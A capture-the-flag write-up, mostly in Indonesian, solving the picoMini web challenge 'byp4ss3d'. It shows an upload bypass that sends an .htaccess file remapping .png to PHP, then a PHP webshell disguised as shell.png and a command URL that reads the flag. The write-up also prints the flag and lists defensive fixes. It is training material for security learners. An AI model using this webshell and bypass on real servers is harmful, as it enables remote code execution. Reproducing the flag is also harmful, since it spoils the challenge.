# 518 - byp4ss3d (Web Exploitation, picoMini by CMU-Africa, Medium)

## Challenge Metadata
- ID: 518 | Event: picoMini by CMU-Africa
- Category: Web Exploitation | Difficulty: Medium (2)
- Author: CyLab Academy / CMU-Africa
- Flag: `academy{s3rv3r_byp4ss_b1e8386b}`

## Problem Statement & Scope
Portal verifikasi identitas mahasiswa universitas (`Student ID Verification`) menyediakan fitur unggah dokumen foto ID (JPG, PNG, GIF) melalui formulir HTML di `/upload.php`. Berkas yang berhasil diunggah langsung ditempatkan pada direktori publik `/images/`.
Tujuan audit (NIST SP 800-115 / OWASP WSTG-UPLD-01): menguji integritas validasi tipe file backend, membypass filter ekstensi, mencapai Remote Code Execution (RCE) di server Apache Debian PHP 8.3, dan mengamankan flag kompetisi.

## Teori & Akar Kerentanan (Root Cause)
1. **Unrestricted File Upload with Inadequate Filename Sanitization:**
   Backend `upload.php` memverifikasi header MIME `Content-Type` yang dikirim oleh klien tanpa melakukan validasi ekstensi berkas secara *strict allowlist* di sisi server.
2. **Apache `.htaccess` Configuration Override Enabled:**
   Konfigurasi Apache web server pada direktori unggahan (`/var/www/html/images/`) tidak menonaktifkan fitur desentralisasi konfigurasi direktori (`AllowOverride None`). Akibatnya, berkas `.htaccess` dapat diunggah langsung ke direktori tersebut.
3. **MIME-Type Handler Remapping:**
   Melalui direktif Apache `AddType application/x-httpd-php .png`, penyerang mendefinisikan ulang ekstensi gambar `.png` agar dievaluasi oleh mesin runtime PHP (`libapache2-mod-php` / FastCGI) alih-alih dilayani sebagai berkas biner statis.

## Rekonstruksi Eksploitasi Step-by-Step
1. Analisis arsitektur aplikasi:
   - Server menjalankan `Apache/2.4.68 (Debian)` dengan `PHP/8.3.33`.
   - Formulir mengarah ke `upload.php` dengan field `name="image"`.
   - Berkas diunggah ke `images/<filename>` dengan tautan langsung.
2. Tahap 1 — Upload `.htaccess` Malicious Configuration:
   - Menyiapkan payload konfigurasi: `AddType application/x-httpd-php .png\n`.
   - Mengirim request multipart form-data dengan filename `.htaccess` dan `Content-Type: image/png`.
   - Server merespons: `Successfully uploaded! Access it at: images/.htaccess`.
3. Tahap 2 — Upload PHP Webshell Berkedok PNG:
   - Menyiapkan webshell: `<?php passthru($_GET["c"]); ?>`.
   - Mengunggah dengan filename `shell.png` dan `Content-Type: image/png`.
   - Server menempatkan file di `images/shell.png`.
4. Tahap 3 — Remote Command Execution:
   - Mengakses `http://chatelaine.cylabacademy.net:36491/images/shell.png?c=id; ls -la /; cat /var/www/flag.txt`.
   - Apache mengeksekusi PHP dan membaca isi berkas flag:
     `academy{s3rv3r_byp4ss_b1e8386b}`.
5. Verifikasi dan pembersihan:
   - Mengirim token flag ke REST API `POST /api/submissions/` -> HTTP 201 `correct: true`.
   - Terminasi instance lab via `DELETE /api/challenges/518/instance/`.

## Flag & Verifikasi
- Flag: `academy{s3rv3r_byp4ss_b1e8386b}` (HTTP 201 `correct: true`, user 1072359).

## Takeaway Kompetensi LKS & Mitigasi Defensif
- **Apache Hardening (`AllowOverride None`):** Konfigurasikan `<Directory /var/www/html/images>` pada `apache2.conf` dengan `AllowOverride None` dan larang eksekusi skrip menggunakan `php_admin_flag engine off` atau `RemoveHandler .php`.
- **Strict File Extension Allowlisting & Name Randomization:** Lakukan validasi nama berkas menggunakan regex ketat `^[a-zA-Z0-9_-]+\.(jpg|jpeg|png|gif)$` dan ganti nama berkas dengan UUID acak (`bin2hex(random_bytes(16)) . '.' . $ext`).
- **Store Uploads Outside Web Root:** Simpan seluruh berkas unggahan pengguna di luar document root publik (misal `/var/uploads/`) dan layani via skrip pengunduh bertingkat yang memvalidasi otorisasi sesi pengguna.
